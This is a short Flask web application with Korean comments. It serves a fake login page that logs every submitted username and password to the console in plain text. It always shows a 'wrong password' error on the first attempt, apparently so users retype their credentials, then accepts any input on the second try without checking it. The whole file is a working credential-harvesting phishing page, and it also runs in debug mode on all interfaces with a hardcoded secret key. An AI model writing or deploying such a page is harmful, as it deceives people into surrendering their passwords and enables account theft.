from flask import Flask, render_template, request, session

app = Flask(__name__)
app.secret_key = 'random_secret_key'  # 세션 암호화 키


@app.route('/', methods=['GET', 'POST'])
def index():
    error = None

    if request .method == 'GET':
    	session .pop('tried', None)

    if request.method == 'POST':
        username = request.form['username']
        password = request.form['password']

        # 아이디 비밀번호 cmd에서 확인 가능
        print(f"ID : {username}")
        print(f"PW : {password}")

        # 첫 번째 시도는 무조건 실패
        if 'tried' not in session:
            session['tried'] = True
            error = '비밀번호가 틀렸습니다.'
            return render_template('index.html', error=error)

        # 두 번째 시도부터는 로그인 성공
        return render_template('main.html', username=username)

    return render_template('index.html', error=error)


if __name__ == '__main__':
    app.run(host='0.0.0.0', port=5000, debug=True)
